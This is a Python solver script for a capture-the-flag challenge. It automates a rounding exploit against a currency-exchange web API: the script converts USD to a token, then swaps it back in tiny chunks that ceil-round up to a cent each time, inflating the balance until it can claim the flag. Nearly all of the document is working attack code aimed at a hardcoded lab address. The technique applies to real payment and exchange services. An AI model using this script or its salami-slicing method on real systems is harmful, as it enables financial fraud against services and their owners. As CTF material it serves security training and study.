#!/usr/bin/env python3
"""
Apex Exchange CTF - Automated Exploit Solver
Vulnerability: Numerical Type Mismatch & Accumulated Rounding (Ceil Policy)

Exploit Mechanics:
- Currency MINI is converted back to USD using floating point division and ceil rounding to 2 decimal places.
- Converting 0.001 MINI to USD:
  Raw USD = 0.001 / 100 = 0.00001 USD
  Ceil Rounding: math.ceil(0.00001 * 100) / 100.0 = $0.01 USD!
- Cost: 0.001 MINI (obtained from $0.00001 USD value).
- Payout: $0.01 USD (net gain of ~$0.01 USD per request).
- Iterating this salami slicing round-trip inflates the USD balance to reach the flag threshold.
"""

import sys
import time
import requests

TARGET_URL = "http://100.91.148.10:5001"

def run_exploit(base_url=TARGET_URL):
    session = requests.Session()

    print(f"[+] Connecting to {base_url}...")
    res = session.get(f"{base_url}/api/wallet")
    if res.status_code != 200:
        print("[-] Failed to reach application.")
        return

    data = res.json()
    wallet = data["wallet"]
    target = data["target_balance"]
    print(f"[+] Initial USD Balance: ${wallet['USD']:.2f}")
    print(f"[+] Target USD Threshold: ${target:.2f}")

    round_count = 0
    start_time = time.time()

    print("[+] Starting high-frequency micro-conversion exploit (Salami Slicing)...")

    while wallet["USD"] < target:
        round_count += 1
        
        # Step 1: Convert $0.01 USD -> 1.0 MINI
        res = session.post(f"{base_url}/api/exchange", json={
            "from_currency": "USD",
            "to_currency": "MINI",
            "amount": 0.01
        })
        wallet = res.json()["wallet"]

        # Step 2: Swap MINI back to USD in micro-chunks of 0.001 MINI
        # 0.001 MINI yields $0.01 USD due to math.ceil rounding!
        mini_chunks = int(wallet["MINI"] / 0.001)
        
        # Micro-swap loop
        for _ in range(mini_chunks):
            res = session.post(f"{base_url}/api/exchange", json={
                "from_currency": "MINI",
                "to_currency": "USD",
                "amount": 0.001
            })
            if res.status_code != 200:
                break
        
        wallet = res.json()["wallet"]
        print(f"[*] Cycle {round_count}: Current USD Balance = ${wallet['USD']:.2f} / ${target:.2f}", end="\r")

    print(f"\n[+] Target reached! Final USD Balance: ${wallet['USD']:.2f}")
    print(f"[+] Total execution time: {time.time() - start_time:.2f}s")

    # Claim Flag
    print("[+] Requesting Flag...")
    flag_res = session.get(f"{base_url}/api/flag")
    flag_data = flag_res.json()
    if flag_data.get("status") == "success":
        print(f"\n🎉 FLAG CAPTURED: {flag_data['flag']}\n")
    else:
        print(f"[-] Failed to get flag: {flag_data.get('message')}")

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    run_exploit(url)
